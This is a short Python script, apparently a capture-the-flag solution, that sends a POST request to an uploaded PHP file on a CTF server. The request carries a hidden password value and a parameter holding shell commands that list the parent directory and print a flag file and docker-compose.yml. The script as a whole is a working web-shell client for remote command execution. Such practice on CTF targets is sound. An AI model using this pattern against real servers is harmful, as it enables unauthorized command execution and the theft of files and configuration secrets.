import requests

BASE = "https://strange.hackthesystem.pro"

URL = BASE + "/upload/uploaded.php"

# URL = "http://localhost:8000/uploaded4.php"

header = {
  "Content-Type": "application/x-www-form-urlencoded"
}

body = {
  "hidden_passw0rd8": "howyoucancrackthis?4301ffbafccd4356",
  "paramparamparam": "ls -lah ..; cat ../flag-5af2e94a1940dadb4db81cb261dda81a6cd68503.php; cat ../docker-compose.yml",
}

r = requests.post(URL, data=body, headers=header)

print(r.text)